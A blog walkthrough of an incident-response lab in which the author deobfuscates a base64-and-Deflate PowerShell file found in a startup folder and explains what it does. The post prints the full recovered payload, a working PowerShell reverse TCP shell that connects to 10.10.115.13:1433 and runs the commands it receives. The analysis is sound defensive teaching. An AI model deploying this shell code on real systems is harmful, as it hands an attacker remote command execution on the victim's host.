---
title: "PowerShell "
classes: wide
header:
  teaser: /assets/images/Tutorials/PS-Walk_Through/path.jpg
ribbon: DodgerBlue
description: "Obfuscated PowerShell walk-through..."
categories:
 - Tutorials
toc: true
---

## Scenario
Analyst!

We found this in a startup folder on a user's host. Sheesh.

This thing makes my brain hurt just by looking at it. Can you figure this out for us, please?

Thanks,

IR Team

---
## file investigation

At first look, I found the lab provides a zip file and a Readme file where the scenario is written. On extracting the file and opening it in VSCode, I found that it seemed like **PowerShell code** so changed the extension to ps1.

![FL](/assets/images/Tutorials/PS-Walk_Through/FL.png)

As you can see the iEx command means to invoke what is coming next and the pipe which makes sense that the code has two parts.

## Deobfuscation
let's break the code. `iEx(nEW-ObJECt  Io.CoMpRESSiOn.defLaTEstReam([iO.memoRYStREam][sYsteM.coNvert]::FROmbaSe64StRiNG` this part has the invoce instruction but what shall be invoced?!!
If you look from a good perspective you will find that this line performs the **Deobfuscation**. First `[system.convert]::FROmbaSe64StRiNG` retrieves the string from B64 then `[io.memoryStream]` creates a new MemoryStream object in which the decoded byte array will be stored. At last `new-Object io.compression.deflateStream` creates a new DeflateStream object used to decompress data that has been compressed using the Deflate algorithm. so it would be really easy to decode the strange part leave it now.
I would prefer to have a look at what resides after the pipe `% {nEW-ObJECt SYsteM.Io.strEAmReAder($_,[SysTEm.TExT.eNCoDIng]::aSCIi) }| % { $_.reaDtoEnD()}` that simply will read data from a stream and outputs the entire content as a string.
So now we need to know what is the stream, For that mission, I would try PowerShell itself but I must at first remove the invoke `iEx` and then store the rest script in the new var.

![FR](/assets/images/Tutorials/PS-Walk_Through/fr.png)

As long as there is no error, we are good ;). So let's see what has been stored in that var.

![content](/assets/images/Tutorials/PS-Walk_Through/content.png)

that's a piece of good news we found our destination.

```powershell

########################################################################";
#                                                                      #";
#                        PowerShell Reverse TCP v3.5                   #";
#                                          by Ivan Sincek              #";
#                                                                      #";
# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
#                                                                      #";
#########################################################################";


$client = $null;
$stream = $null;
$buffer = $null;
$writer = $null;
$data = $null;
$result = $null;
try {
 $ip = "10.10.115.13"
 $port = 1433
 $client = New-Object Net.Sockets.TcpClient($ip, $port);
 $stream = $client.GetStream();
 $buffer = New-Object Byte[] 1024;
 $encoding = New-Object Text.AsciiEncoding;
 $writer = New-Object IO.StreamWriter($stream);
 $writer.AutoFlush = $true;
 $bytes = 0;
 do {
 $writer.Write("PS>");
 do {
 $bytes = $stream.Read($buffer, 0, $buffer.Length);
 if ($bytes -gt 0) {
 $data = $data + $encoding.GetString($buffer, 0, $bytes);
 }
 } while ($stream.DataAvailable);
 if ($bytes -gt 0) {
 $data = $data.Trim();
 if ($data.Length -gt 0) {
 try {
 $result = Invoke-Expression -Command $data 2>&1 | Out-String;
 } catch {
 $result = $_.Exception | Out-String;
 }
 Clear-Variable -Name "data";
 $length = $result.Length;
 if ($length -gt 0) {
 $count = 0;
 do {
 if ($length -ge $buffer.Length) { $bytes = $buffer.Length; } else { $bytes = $length; }
 $writer.Write($result.substring($count, $bytes));
 $count += $bytes;
 $length -= $bytes;
 } while ($length -gt 0);
 Clear-Variable -Name "result";
 }
 }
 }
 } while ($bytes -gt 0);
} catch {
 $_.Exception.InnerException.Message;
} finally {
 if ($writer -ne $null) {
 $writer.Close();
 $writer.Dispose();
 Clear-Variable -Name "writer";
 }
 if ($stream -ne $null) {
 $stream.Close();
 $stream.Dispose();
 Clear-Variable -Name "stream";
 }
 if ($client -ne $null) {
 $client.Close();
 $client.Dispose();
 Clear-Variable -Name "client";
 }
 if ($buffer -ne $null) {
 $buffer.Clear();
 Clear-Variable -Name "buffer";
 }
 if ($result -ne $null) {
 Clear-Variable -Name "result";
 }
 if ($data -ne $null) {
 Clear-Variable -Name "data";
 }
 [System.GC]::Collect();
}
```
## Code illustration

To understand this let's break it into small parts, the code has four parts:

1- Script Information Block: The initial block is a comment section providing metadata about the script such as version, author, GitHub repository, and donation address.
2- Variable Initialization: $client, $stream, $buffer, $writer, $data, and $result are initialized to $null
3- Try Catch Block:
that's the most interesting block where the script tries to establish a TCP connection with C2.
first set port and ip `10.10.115.13 : 1433` then establish TCP connection:
- $client is created as a new TCP client connecting to the specified IP and port.
- $stream is obtained from the TCP client to facilitate data transmission.
- $buffer is a byte array of size 1024 to store incoming data.
- $encoding is set to ASCII encoding.
- $writer is an IO.StreamWriter for writing data to the stream with AutoFlush set to $true.
after that the script enters a do loop which continually prompts the remote user with "PS>" and waits for commands, reads incoming data from the stream into the buffer until no more data is available and converts the byte data to a string using ASCII encoding and appends it to **$data**.
after that enters the inner loop, if $data is not empty, it attempts to execute the PowerShell command using Invoke-Expression, captures the output or exception into $result and finally clears $data.

Of course, if there is an exception that is where the catch comes to act.

Finally Block: finally, loses and disposes of the writer, stream, client, and clears all variables and Forces garbage collection with  `[System.GC]::Collect()`.

## Conclusion

In this investigation, we analyzed an obfuscated PowerShell script found in a user's startup folder. The script, once deobfuscated, revealed itself as a PowerShell reverse TCP script by Ivan Sincek, designed to allow remote command execution on the compromised host.

### Key Findings
Obfuscation:
The script uses base64 decoding and Deflate compression to hide its true function.
Deobfuscation revealed the script's purpose and content.

Functionality:
Establishes a TCP connection to a remote IP (10.10.115.13) on port 1433.
Reads commands from the attacker, executes them and sends back the results.

**Code Structure:**

Initialization: 
Sets up variables and TCP connection.
Command Execution Loop: Continuously reads and executes remote commands.
Cleanup: Handles exceptions and disposes of resources.

##
- VSCode
- Cmder

#### Written by

## *Karim Gomaa*
